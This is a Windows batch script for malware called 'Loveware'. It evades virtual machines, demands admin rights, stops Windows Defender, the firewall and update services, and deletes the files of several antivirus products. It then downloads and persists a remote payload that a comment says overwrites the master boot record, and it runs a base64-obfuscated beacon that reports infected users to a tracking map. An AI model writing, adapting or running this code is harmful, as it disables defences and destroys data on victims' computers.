@echo off
::    ,--,                                                                           
::  ,---.'|                                                                           
::  |   | :                                                                           
::  :   : |                                                                           
::  |   ' :      ,---.                              .---.             __  ,-.         
::  ;   ; '     '   ,'\      .---.                 /. ./|           ,' ,'/ /|         
::  '   | |__  /   /   |   /.  ./|  ,---.       .-'-. ' |  ,--.--.  '  | |' | ,---.   
::  |   | :.'|.   ; ,. : .-' . ' | /     \     /___/ \: | /       \ |  |   ,'/     \  
::  '   :    ;'   | |: :/___/ \: |/    /  | .-'.. '   ' ..--.  .-. |'  :  / /    /  | 
::  |   |  ./ '   | .; :.   \  ' .    ' / |/___/ \:     ' \__\/: . .|  | ' .    ' / | 
::  ;   : ;   |   :    | \   \   '   ;   /|.   \  ' .\    ," .--.; |;  : | '   ;   /| 
::  |   ,/     \   \  /   \   \  '   |  / | \   \   ' \ |/  /  ,.  ||  , ; '   |  / | 
::  '---'       `----'     \   \ |   :    |  \   \  |--";  :   .'   \---'  |   :    | 
::                          '---" \   \  /    \   \ |   |  ,     .-./       \   \  /  
::                                 `----'      '---"     `--`---'            `---  
::
::                                                                         

color 35

title Loveware

:: Detect if program is running in virtualmachine

FOR /F "tokens=* USEBACKQ" %%F IN (`PowerShell.exe -command " (gwmi Win32_BaseBoard).Manufacturer -eq 'Microsoft Corporation' "`) DO (
SET check=%%F
)
echo %check%

if %check% == False (
    echo Dim WshShell, BtnCode>C:\Windows\ifvm.vbs
    echo Set WshShell = WScript.CreateObject("WScript.Shell")>>C:\Windows\ifvm.vbs
    echo BtnCode = WshShell.Popup("Could not start process!",2+48,"Taskmanager")>>C:\Windows\ifvm.vbs
    echo Select Case BtnCode>>C:\Windows\ifvm.vbs
    echo case 3 WScript.Echo "ERROR">>C:\Windows\ifvm.vbs
    echo case 4 WScript.Echo "ERROR">>C:\Windows\ifvm.vbs
    echo case 5 WScript.Echo "ERROR">>C:\Windows\ifvm.vbs
    echo End Select>>C:\Windows\ifvm.vbs
    start C:\Windows\ifvm.vbs
    pause
    exit
) else (
    goto valentine

:valentine

for /f "skip=1" %%x in ('wmic os get localdatetime') do if not defined MyDate set MyDate=%%x
for /f %%x in ('wmic path win32_localtime get /format:list ^| findstr "="') do set %%x

set today=%Year%

for /f "delims=" %%a in ('c:\date.exe +%%w') do set DayOfWeek=%%a
if %DayOfWeek% == 14-02-%Year% (
    msg * Happy Valentine!!!
    pause
    exit
) else (
    goto :admin
)

:: Only run as admin function

:admin

net session >nul 2>&1

if %errorLevel% == 0 (
    goto runner
) else (
    echo msgbox("Please run as admin",0+64,"Admin") > C:\Windows\Admin.vbs
    start C:\Windows\Admin.vbs
    pause
    exit
)

:runner

net stop "SDRSVC"
net stop "WinDefend"
taskkill /f /t /im "MSASCui.exe"
net stop "security center"
netsh firewall set opmode mode-disable
net stop "wuauserv"
net stop "Windows Defender Service"
net stop "Windows Firewall"
net stop sharedaccess

del /Q /F C:\Program Files\alwils~1\avast4\*.*
del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
del /Q /F C:\Program Files\kasper~1\*.exe
del /Q /F C:\Program Files\trojan~1\*.exe
del /Q /F C:\Program Files\f-prot95\*.dll
del /Q /F C:\Program Files\tbav\*.dat
del /Q /F C:\Program Files\avpersonal\*.vdf
del /Q /F C:\Program Files\Norton~1\*.cnt
del /Q /F C:\Program Files\Mcafee\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\*.*
del /Q /F C:\Program Files\Norton~1\*.*

:: Change file name to Loveware

RENAME %0 Loveware.exe

:: Move Loveware to the windows directory

MOVE /e /y Loveware.exe C:\Windows

:: Download file that will overwrite the mbr

powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/TheG0df2ther/Loveware/master/Loveware/FinalPayload/FinalPayload.exe', 'SomeHugs.exe')"
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/TheG0df2ther/Loveware/master/Loveware/FinalPayload/FinalPayload.exe -OutFile SomeHugs.exe"

:: Copy SomeHugs.exe to the startup folder to prevent
:: people from escaping death.

XCOPY "%USERPROFILE%\Downloads\SomeHugs.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Goto canarytoken link that will add the infected by Loveware user to the Loveware Infected map.
:: Loveware infected map: https://canarytokens.org/manage?token=h8blu81q8j2vzu825fmpzut7r&auth=e8be20c708872b669cd4562d35b5abf7

PowerShell.exe -command "Set-ExecutionPolicy Unrestricted"

echo set "base64string=c3RhcnQgL21pbiBodHRwOi8vY2FuYXJ5dG9rZW5zLmNvbS90YWdzL3Rlcm1zL2g4Ymx1ODFxOGoydnp1ODI1Zm1wenV0N3IvY29udGFjdC5waHA=">>Canary.ps1
echo for /f "tokens=* delims=" %%# in ('powershell [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("""%base64string%"""^)^)') do set "decoded=%%#">>Canary.ps1

echo echo %decoded% | Out-File -FilePath C:\Windows\Canary.bat -Force>>Canary.ps1

start /min Canary.ps1

timeout 8